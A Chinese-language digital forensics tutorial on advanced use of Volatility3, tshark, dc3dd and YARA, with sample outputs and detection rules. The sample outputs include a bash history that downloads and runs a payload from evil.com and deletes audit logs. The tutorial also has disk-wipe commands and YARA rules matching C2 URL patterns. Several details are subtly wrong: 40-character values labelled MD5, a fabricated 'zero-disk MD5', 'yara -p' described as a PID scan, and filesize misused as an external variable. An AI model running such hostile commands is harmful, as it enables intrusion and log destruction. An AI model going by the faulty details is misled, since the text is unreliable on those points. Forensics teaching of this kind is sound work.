## 高级用法与实战技巧

### Volatility3 高级用法

#### Windows 内存分析插件全览

```bash
# vol3 基本调用格式
vol -f memory.dmp <plugin>
# 或指定 plugin 目录
vol -f memory.dmp --plugins /opt/volatility3/plugins <plugin>

# ===== 进程分析 =====

# pslist — 基于 EPROCESS 双链表的活跃进程列表
vol -f memory.dmp windows.pslist
# 输出示例:
# Offset (V) PID     PPID    Name                 Start Time
# 0xb0123456  4      0       System
# 0xb0234567  884    4       Registry
# 0xb0345678  1232   884     svchost.exe
# 0xb0456789  4567   1232    malware.exe          2024-01-15 03:42:18.000000

# psscan — 基于池标签扫描，可发现已终止/隐藏进程（rootkit 检测）
vol -f memory.dmp windows.psscan
# 能发现被 DKOM (Direct Kernel Object Manipulation) 隐藏的进程
# 输出格式与 pslist 相同，但可能包含 pslist 中不存在的进程

# cmdline — 每个进程的命令行参数（还原完整执行命令）
vol -f memory.dmp windows.cmdline
# 输出示例:
# 4567  malware.exe  "C:\Users\admin\Downloads\malware.exe" --silent --c2=evil.com:443
# 5678  powershell.exe powershell -enc SQBFAFgAKABOAGUAdwAtAE8AY...

# cmdline 按 PID 过滤
vol -f memory.dmp windows.cmdline --pid 4567

# pstree — 进程树视图（父子关系）
vol -f memory.dmp windows.pstree
# 输出示例:
# ***  ***
# |.. 4      4         System
# |.... 884   884      Registry
# |.... 1232  1232     svchost.exe
# |...... 4567 4567    malware.exe          <- 可疑子进程
# |...... 5678 5678    powershell.exe       <- 可疑子进程
```

#### 网络连接与恶意代码检测

```bash
# ===== 网络分析 =====

# netstat — 活动网络连接（等同 Windows netstat -ano）
vol -f memory.dmp windows.netstat
# 输出示例:
# Offset (V)  Proto   LocalAddr       LocalPort   ForeignAddr     ForeignPort    State       PID
# 0xe1234567  TCPv4   10.0.0.5        49152       93.184.216.34   443            ESTABLISHED 4567
# 0xe2345678  TCPv4   0.0.0.0         4444        0.0.0.0         0              LISTENING   4567
# 0xe3456789  UDPv4   0.0.0.0         161         *               *                          1232

# netscan — 基于池标签扫描的网络连接（可发现隐藏连接）
vol -f memory.dmp windows.netscan

# ===== 恶意代码检测 =====

# malfind — 检测注入的代码（RX 权限的内存区域）
vol -f memory.dmp windows.malfind
# 输出示例:
# PID     Start           End             Protection      Tag
# 4567    0x1a00000000    0x1a00001000    PAGE_EXECUTE_READWRITE  Shellcode?
# 4567    0x1a00001000    0x1a00002000    PAGE_EXECUTE_READWRITE  Shellcode?
# MZ 标头 / 字节内容也同时输出，可用于提取 shellcode

# malfind 按 PID 过滤并导出注入代码
vol -f memory.dmp windows.malfind --pid 4567 --dump
# 生成: pid.4567.vaddr.0x1a00000000.dmp 等文件
```

#### 句柄、注册表与环境变量

```bash
# ===== 句柄分析 =====

# handles — 进程句柄（文件/注册表/互斥体/事件等）
vol -f memory.dmp windows.handles --pid 4567
# 输出示例:
# Offset (V)   Handle   Type       Details
# 0xe1234567   0x4c     File       \Device\HarddiskVolume2\Users\admin\Downloads\malware.exe
# 0xe2345678   0x50     Key        \REGISTRY\MACHINE\SOFTWARE\malware
# 0xe3456789   0x58     Mutant     Global\\malware_mutex_2024
# 0xe456789a   0x60     Event      Global\\malware_ready_event

# ===== 注册表分析 =====

# hivelist — 列出所有注册表蜂巢
vol -f memory.dmp windows.registry.hivelist
# 输出示例:
# Offset (V)   Offset (P)   hive name                file path
# 0xfffff800   0x1a0000     \SystemRoot\System32\Config\SOFTWARE  \??\C:\Windows\System32\config\SOFTWARE
# 0xfffff900   0x1b0000     \SystemRoot\System32\Config\SYSTEM   \??\C:\Windows\System32\config\SYSTEM

# registry.printkey — 打印注册表键值
vol -f memory.dmp windows.registry.printkey --key "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
# 输出示例:
# Last Write: 2024-01-15 03:42:18.000000
# Key Name: Run
# Name      Type       Data
# Security  REG_SZ     C:\Users\admin\Downloads\malware.exe  <- 持久化!

# registry.userassist — UserAssist 记录（程序执行历史）
vol -f memory.dmp windows.registry.userassist
# 输出示例:
# RegHive    Last Write           count  focus  time           application
# NTUSER.DAT 2024-01-15 03:42:18  3      0      00:00:05.234   %TEMP%\malware.exe
```

#### 服务、模块与环境变量

```bash
# ===== 服务分析 =====

# svcscan — 列出所有服务（含已终止和隐藏的）
vol -f memory.dmp windows.svcscan
# 输出示例:
# Offset (V)   Order  PID     State    Name              Display Name       Binary Path
# 0xe1234567   42     1232    Running  MalwareSvc        Malware Service    C:\Windows\malware.exe
# 0xe2345678   43     1232    Stopped  WinDefend         Windows Defender   C:\ProgramData\Microsoft\...

# svcscan 过滤服务名
vol -f memory.dmp windows.svcscan --name "malware"

# ===== 内核模块分析 =====

# modscan — 按池标签扫描已加载内核模块（可发现隐藏模块）
vol -f memory.dmp windows.modscan
# 输出示例:
# Offset (V)   Name                   Base           Size
# 0xfffff800   ntoskrnl.exe           0xfffff801     0x1a00000
# 0xfffff801   malicious_driver.sys   0xfffff803     0x10000     <- 可疑: 未签名驱动

# modules — 基于 PsLoadedModuleList 的模块列表
vol -f memory.dmp windows.modules

# ===== 环境变量 =====

# envars — 进程环境变量（可能包含路径、配置、凭据）
vol -f memory.dmp windows.envars --pid 4567
# 输出示例:
# PID     Block      Variable           Value
# 4567    0x12345    C2_SERVER          evil.com
# 4567    0x12345    C2_PORT            443
# 4567    0x12345    ENCRYPT_KEY        s3cr3tk3y12345
```

#### Linux 内存分析

```bash
# ===== Linux 进程分析 =====

# pslist — Linux 活跃进程列表
vol -f memory.dump linux.pslist
# 输出示例:
# OFFSET (V)  PID     PPID    COMM
# 0xffff888   1       0       systemd
# 0xffff999   1234    1       sshd
# 0xffffaaa   5678    1234    bash
# 0xffffbbb   9999    5678    malware_binary

# psaux — 等同 ps aux 命令（含完整命令行）
vol -f memory.dump linux.psaux
# 输出示例:
# PID     COMM            ARGS
# 9999    malware_binary  /tmp/malware_binary --c2=evil.com:443 --persist

# bash — 提取 bash 历史记录
vol -f memory.dump linux.bash
# 输出示例:
# PID     CommandTime              Command
# 5678    2024-01-15 03:42:18      wget http://evil.com/malware_binary
# 5678    2024-01-15 03:42:25      chmod +x /tmp/malware_binary
# 5678    2024-01-15 03:42:30      ./malware_binary --c2=evil.com:443
# 5678    2024-01-15 03:43:00      rm -rf /var/log/audit/*
```

#### 输出格式与 Profile 选择

```bash
# ===== 输出格式控制 =====

# CSV 输出（适合导入 Excel/Splunk）
vol -f memory.dmp windows.pslist --output csv -o pslist.csv
# pslist.csv 内容示例:
# Offset (V),PID,PPID,Name,Start Time
# 0xb0123456,4,0,System,
# 0xb0234567,884,4,Registry,

# JSON 输出（适合自动化处理）
vol -f memory.dmp windows.pslist --output json -o pslist.json
# pslist.json 内容示例:
# {"Offset (V)": "0xb0123456", "PID": 4, "PPID": 0, "Name": "System"}
# {"Offset (V)": "0xb0234567", "PID": 3, "PPID": 4, "Name": "Registry"}

# 多格式同时输出 — 先分析再转格式
vol -f memory.dmp windows.malfind --output json -o malfind.json
vol -f memory.dmp windows.netstat --output csv -o netstat.csv
vol -f memory.dmp windows.handles --pid 4567 --output json -o handles.json

# ===== Profile / Symbol 表选择 =====

# Volatility3 自动识别 Profile，但有时需要手动指定
# 查看自动识别结果
vol -f memory.dmp windows.info
# 输出示例:
# Memory Pattern 0x00000001
# Major/Minor     15.17763
# Build           17763 (Windows Server 2019)
# Arch            x64

# 手动指定 Symbol 表路径（当自动识别失败时）
vol -f memory.dmp --symbol-dirs /opt/volatility3/symbols windows.pslist

# 使用 ISF (Intermediate Symbol Format) 文件
# 从 PDB 自动下载:
vol -f memory.dmp --symbol-dirs /opt/symbols windows.info
# 或手动下载 PDB → 转换为 ISF:
# 1. 获取内核 PDB 文件
# 2. 使用 pdbconv.py 转换: python pdbconv.py -p ntkrnlmp.pdb -o ntkrnlmp.json
# 3. 放入 symbol-dirs 指定的目录
```

---

### tshark 高级用法

#### 协议层次统计与会话分析

```bash
# ===== 协议层次统计 =====

# -z io,phs — 协议层次统计（整体流量概览）
tshark -r capture.pcap -z io,phs -q
# 输出示例:
# === Protocol Hierarchy ===
# Protocol                                 frames    bytes
# eth                                       15234   8234567
# ├─ip                                      15000   8100000
# │ ├─tcp                                   12000   7000000
# │ │ ├─tls                                 8000    5000000
# │ │ ├─http                                2000    1000000
# │ │ └─ssh                                 1000     500000
# │ ├─udp                                   3000    1100000
# │ │ ├─dns                                  500     50000
# │ │ └─quic                                 2000   1000000
# │ └─icmp                                   200     16000
# └─arp                                      234    134567
# 可快速识别: TLS 流量占大头、有 SSH/HTTP 明文、DNS 查询量

# ===== 会话/对话列表 =====

# -z conv,tcp — TCP 会话统计（按源-目的对分组）
tshark -r capture.pcap -z conv,tcp -q
# 输出示例:
# === TCP Conversations ===
#                                        <-     |       ->      |    Total
# Address A           Address B           Frames  Bytes  Frames  Bytes  Frames  Bytes
# 10.0.0.5:49152      93.184.216.34:443    1200   60000   1500  800000  2700  860000
# 10.0.0.5:49153      93.184.216.34:8443    500   25000    800  400000  1300  425000
# 10.0.0.5:49154      10.0.0.1:22           300   15000    400  200000   700  215000
# 可快速识别: 大量数据外传到 93.184.216.34:443、有 SSH 连接

# -z conv,udp — UDP 会话统计
tshark -r capture.pcap -z conv,udp -q
# 输出示例:
# 10.0.0.5:53          10.0.0.1:53           200   20000    200  20000   400  40000
# 10.0.0.5:5353        224.0.0.251:5353      100   10000     50   5000   150  15000
```

#### 文件提取与流跟踪

```bash
# ===== 文件提取 =====

# --export-objects — 从 pcap 中提取传输的文件
tshark -r capture.pcap --export-objects http,/tmp/extracted_http
# 将所有 HTTP 传输的文件提取到 /tmp/extracted_http/
# 输出示例:
# 100 file(s) extracted to /tmp/extracted_http/
# ls /tmp/extracted_http/:
#   malware.exe  config.json  login.html  upload.php

# 提取 SMB 传输的文件
tshark -r capture.pcap --export-objects smb,/tmp/extracted_smb

# 提取 DICOM (医学影像) 文件
tshark -r capture.pcap --export-objects dicom,/tmp/extracted_dicom

# 提取 FTP 文件
tshark -r capture.pcap --export-objects ftp,/tmp/extracted_ftp

# ===== 流跟踪 =====

# -z follow,tcp,ascii,0 — 跟踪第 0 条 TCP 流（ASCII 格式）
tshark -r capture.pcap -z follow,tcp,ascii,0 -q
# 输出示例:
# === Follow TCP stream (0) ===
#    00000000  47 45 54 20 2F 6D 61 6C  77 61 72 65 2E 65 78 65  GET /malware.exe
#    ...
# [客户端→服务器]
# GET /malware.exe HTTP/1.1
# Host: evil.com
#
# [服务器→客户端]
# HTTP/1.1 200 OK
# Content-Type: application/octet-stream
# Content-Length: 245678
#
# MZ.......................

# 跟踪指定流编号
tshark -r capture.pcap -z follow,tcp,ascii,5 -q

# 跟踪流并提取原始数据
tshark -r capture.pcap -z follow,tcp,raw,0 -q | tail -n +7 | xxd -r -p > extracted_data.bin

# 跟踪 HTTP 流
tshark -r capture.pcap -z follow,http,ascii,0 -q

# 跟踪 UDP 流（如 DNS）
tshark -r capture.pcap -z follow,udp,ascii,0 -q
```

#### GeoIP 地理定位

```bash
# ===== GeoIP 地理定位 =====

# 需要先配置 MaxMind GeoIP 数据库
# 在 ~/.config/wireshark/geoip 或 /usr/share/GeoIP 配置 MaxMindDB

# 显示 IP 地理位置信息
tshark -r capture.pcap -Y "ip.dst != 10.0.0.0/8" \
  -T fields -e ip.dst -e ip.geoip.dst_country -e ip.geoip.dst_city
# 输出示例:
# 93.184.216.34    United States      Norwell
# 185.220.101.45   Russia             Moscow         <- Tor 出口节点?
# 45.137.21.9      Russia             Saint Petersburg
# 可快速识别: 数据外传到俄罗斯/已知恶意 IP 归属地

# 提取所有外部通信的国家统计
tshark -r capture.pcap -Y "ip.dst != 10.0.0.0/8" \
  -T fields -e ip.geoip.dst_country | sort | uniq -c | sort -rn
# 输出示例:
#    8500 United States
#    2100 Russia
#     500 China
#      50 Tor Exit Nodes
```

#### 专家信息与统计

```bash
# ===== 专家信息 =====

# -z expert — 专家信息（警告、错误、备注）
tshark -r capture.pcap -z expert -q
# 输出示例:
# === Expert Info ===
# Severity  Group     Protocol   Summary
# Note      Sequence  TCP        Connection establishment
# Chat      Sequence  TCP        Connection finish (FIN)
# Warning   Sequence  TCP        Out-of-order segment
# Warning   Sequence  TCP        Retransmission (feature)
# Warning   Malformed HTTP       Malformed packet
# 可快速识别: 大量重传可能表示网络不稳定或中间人攻击

# 按 Wireshark 显示过滤器过滤后再统计
tshark -r capture.pcap -Y "tcp.port == 443" -z conv,tcp -q

# ===== 统计 IO =====

# -z io,stat — 按时间间隔统计 IO
tshark -r capture.pcap -z io,stat,1 -q
# 输出示例:
# === I/O Statistics ===
# | Interval | frames | bytes  | frames/s | bytes/s |
# | 0-1 sec  |   500  | 250000 |    500   | 250000  |
# | 1-2 sec  |  2000  | 1000000|   2000   | 1000000 |  <- 流量突增!
# | 2-3 sec  |   100  |  50000 |    100   |  50000  |

# 按协议统计 IO
tshark -r capture.pcap -z io,stat,0,ip.src==10.0.0.5 -q
```

---

### dc3dd 高级用法

#### 哈希验证

```bash
# ===== 哈希验证（取证完整性保障）=====

# 同时计算 MD5 和 SHA256 哈希
dc3dd if=/dev/sdb of=disk_image.dd hash=md5,sha256 hashlog=hashes.txt
# hashes.txt 内容示例:
# md5: a1b2c3d4e5f6789012345678901234567890abcd
# sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855

# 分离哈希日志（镜像和哈希可以分别存储）
dc3dd if=/dev/sdb of=disk_image.dd hash=sha256 hashlog=/secure/hashes/sha256_log.txt

# 验证已有镜像的哈希
dc3dd if=disk_image.dd hash=md5 hashlog=verify_hashes.txt
# 然后比对 verify_hashes.txt 与原始 hashes.txt

# 多哈希算法同时验证（双重保险）
dc3dd if=/dev/sdb of=disk_image.dd \
  hash=md5 hashlog=md5.log \
  hash=sha256 hashlog=sha256.log \
  hashlog=combined_hashes.txt
```

#### 分割镜像

```bash
# ===== 分割镜像 =====

# 将镜像分割为 4GB 的块（适应 FAT32/exFAT 文件系统限制）
dc3dd if=/dev/sdb of=disk_part.img split=4G
# 生成: disk_part.img.000, disk_part.img.001, disk_part.img.002, ...

# 分割 + 哈希验证
dc3dd if=/dev/sdb of=disk_part.img \
  split=4G \
  hash=sha256 hashlog=split_hashes.txt
# split_hashes.txt 内容示例:
# sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
# sha256 chunk 0: abc123...
# sha256 chunk 1: def456...

# 分割 + 自定义命名
dc3dd if=/dev/sdb of=evidence_drive.img split=2G splitformat=NNN
# 生成: evidence_drive.img.000, evidence_drive.img.001, ...
```

#### 数据擦除

```bash
# ===== 数据擦除（安全清除）=====

# 单次零填充擦除
dc3dd of=/dev/sdb wipe=zero
# 用 0x00 覆写整个磁盘

# 随机数据擦除（更难恢复）
dc3dd of=/dev/sdb wipe=random
# 用随机数据覆写整个磁盘

# 多次擦除（DoD 5220.22-M 标准模拟）
# 第一次: 全零覆写
dc3dd of=/dev/sdb wipe=zero
# 第二次: 随机数据覆写
dc3dd of=/dev/sdb wipe=random
# 第三次: 全零覆写
dc3dd of=/dev/sdb wipe=zero

# 擦除后验证
dc3dd if=/dev/sdb hash=md5 hashlog=verify_wipe.txt
# 如果擦除成功, MD5 应为: 5a23f4b8c0c1c1e1e1e1e1e1e1e1e1e1 (全零盘的 MD5)
```

#### 模式写入

```bash
# ===== 模式写入 =====

# 写入特定十六进制模式
dc3dd of=/dev/sdb pat=00
# 等同 wipe=zero，用 0x00 覆写

dc3dd of=/dev/sdb pat=FF
# 用 0xFF 覆写整个磁盘

dc3dd of=/dev/sdb pat=deadbeef
# 用 0xDEADBEEF 模式覆写

# 模式写入 + 哈希验证
dc3dd of=/dev/sdb pat=00 hash=md5 hashlog=pattern_hash.txt
# pattern_hash.txt 内容示例:
# md5: 5a23f4b8c0c1c1e1e1e1e1e1e1e1e1e1

# 模式写入到文件（用于测试取证工具）
dc3dd of=test_image.dd pat=41414141 size=100M
# 生成一个 100MB 的文件, 内容全为 "AAAA"
```

#### 实战: 完整取证镜像流程

```bash
# 完整取证镜像流程 — 哈希 + 分割 + 日志
dc3dd if=/dev/sdb \
  of=evidence_disk.img \
  split=4G \
  hash=md5,sha256 \
  hashlog=evidence_hashes.txt \
  log=dc3dd_log.txt
# dc3dd_log.txt 内容示例:
# dc3dd 7.2.646 started at 2024-01-15_03:42:18
# Input: /dev/sdb
# Output: evidence_disk.img
# Split: 4G
# Hashes: md5, sha256
# ...
# 500107862016 bytes (465 GB) copied, 7200.00 s, 64.5 MB/s
# md5: a1b2c3d4e5f6789012345678901234567890abcd
# sha256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
```

---

### YARA 高级用法

#### 规则编写基础: meta / strings / condition

```yara
// 基本规则结构
rule malware_detector
{
    // ===== meta 段 — 元数据（不参与匹配）=====
    meta:
        description = "Detects custom malware family"
        author = "forensics-team"
        date = "2024-01-15"
        version = "1.0"
        reference = "https://internal-wiki/malware-analysis"
        malware_family = "CustomRAT"
        severity = "high"

    // ===== strings 段 — 定义要匹配的模式 =====
    strings:
        // 文本字符串（不区分大小写）
        $text_string = "malware" nocase

        // 精确文本（区分大小写）
        $c2_url = "http://evil.com/c2"

        // 宽字符字符串（Windows 常用 UTF-16LE）
        $wide_string = "C:\\Windows\\System32\\malware.exe" wide ascii

        // 十六进制字符串（字节序列）
        $hex_pattern = { 4D 5A 90 00 03 00 00 00 }

        // 十六进制通配符
        $hex_wildcard = { 4D 5A ?? ?? 03 00 00 [2-4] 00 }

        // 正则表达式
        $regex_ip = /[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/

    // ===== condition 段 — 匹配条件 =====
    condition:
        // 任意一个字符串匹配即报警
        $text_string or $c2_url or $wide_string
}
```

#### 十六进制字符串与通配符

```yara
rule hex_patterns_advanced
{
    meta:
        description = "Advanced hex pattern matching"

    strings:
        // 精确字节序列
        $mz_header = { 4D 5A }                           // PE 文件头

        // 通配符 ?? 匹配任意单字节
        $partial = { 4D 5A ?? ?? 03 00 }

        // 跳转 [n] — 跳过 n 个字节
        $jump_fixed = { 4D 5A [4] 03 00 }                // 跳过 4 字节

        // 范围跳转 [n-m] — 跳过 n 到 m 个字节
        $jump_range = { 4D 5A [2-6] 03 00 }              // 跳过 2-6 字节

        // 无限跳转 [-] — 跳过任意数量字节
        $jump_any = { 4D 5A [-] 03 00 }

        // 混合使用
        $complex = { 4D 5A [2-4] ?? ?? [-] 50 45 00 00 } // PE 头检测

        // 多选 { (AA|BB|CC) } — 匹配 AA 或 BB 或 CC
        $alternatives = { 4D 5A ( 90 00 | 03 00 | 04 00 ) }

    condition:
        any of them
}
```

#### 正则表达式与私有规则

```yara
// ===== 正则表达式 =====
rule regex_yara
{
    strings:
        // 匹配 IP 地址
        $ip = /[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/

        // 匹配 URL
        $url = /https?:\/\/[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}\/?/

        // 匹配邮箱
        $email = /[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}/

        // 匹配 base64 编码字符串（50+ 字符）
        $base64 = /[A-Za-z0-9+\/]{50,}={0,2}/

    condition:
        $ip and $url
}

// ===== 私有规则 =====
// private 规则不直接触发告警，只能被其他规则引用
private rule pe_is_32bit
{
    condition:
        uint16(0) == 0x5A4D and              // MZ 头
        uint32(uint32(0x3C)) == 0x00004550   // PE 头
}

rule detect_32bit_malware
{
    strings:
        $payload = { 4D 5A 90 00 }

    condition:
        pe_is_32bit and $payload             // 引用私有规则
}
```

#### 外部变量与模块

```yara
// ===== 外部变量 =====
// 外部变量允许在扫描时动态传入参数
rule file_size_check
{
    condition:
        filesize < 100KB and uint16(0) == 0x5A4D
}
// 命令行传入变量:
// yara -d filesize=102400 file_size_check.yar target.exe

import "pe"
import "hash"

rule malware_with_imports
{
    condition:
        uint16(0) == 0x5A4D and
        pe.imphash() == "5f5b1bf3c2d0e1e1e1e1e1e1e1e1e1e1" and  // 已知恶意 imphash
        hash.md5(0, filesize) == "a1b2c3d4e5f678901234567890abcd"
}
```

#### 递归扫描目录

```bash
# ===== 递归扫描目录 =====

# 基本递归扫描
yara -r rules.yar /path/to/scan/
# 输出示例:
# malware_detector /path/to/scan/suspicious.exe
# malware_detector /path/to/scan/subdir/another.dll
# pe_is_32bit /path/to/scan/legitimate.exe

# 扫描指定扩展名
find /path/to/scan/ -name "*.exe" -o -name "*.dll" | \
  xargs yara rules.yar

# 递归扫描 + 显示匹配的字符串
yara -s -r rules.yar /path/to/scan/
# 输出示例:
# malware_detector /path/to/scan/suspicious.exe
# 0x4c   $text_string: malware
# 0x1a0  $c2_url: http://evil.com/c2
# 0x3f0  $hex_pattern: 4D 5A 90 00 03 00 00 00

# 扫描 + 显示匹配的元数据
yara -m -r rules.yar /path/to/scan/
# 输出示例:
# malware_detector /path/to/scan/suspicious.exe
# description: Detects custom malware family
# author: forensics-team
# severity: high

# 多规则文件扫描
yara -r rules1.yar rules2.yar rules3.yar /path/to/scan/

# 扫描进程内存
yara -p 1234 rules.yar              # 扫描 PID 1234
yara -p 0 rules.yar                 # 扫描当前进程
```

#### 实战: 综合取证检测规则

```yara
import "pe"
import "math"

rule apt_persistence_mechanism
{
    meta:
        description = "Detects APT persistence via scheduled task + DLL hijacking"
        author = "forensics-team"
        severity = "critical"
        date = "2024-01-15"

    strings:
        // scheduled task XML 特征
        $schtasks = "schtasks" nocase
        $xml_task = "<Task" nocase
        $xml_action = "<Exec" nocase

        // DLL 劫持特征
        $dll_hijack = "LoadLibrary" nocase
        $sideload_path = "System32\\\\.*\\.dll" nocase

        // C2 通信特征
        $c2_pattern = /https?:\/\/[a-z0-9-]+\.tk\/[a-z0-9]+/ nocase

        // 加密配置
        $crypto = { 63 7C 77 7B F2 6B 6F C5 }   // AES S-box

    condition:
        uint16(0) == 0x5A4D and
        pe.is_pe and
        filesize < 500KB and
        (2 of ($schtask*, $xml_*)) and
        $dll_hijack and
        $c2_pattern
}
```

---
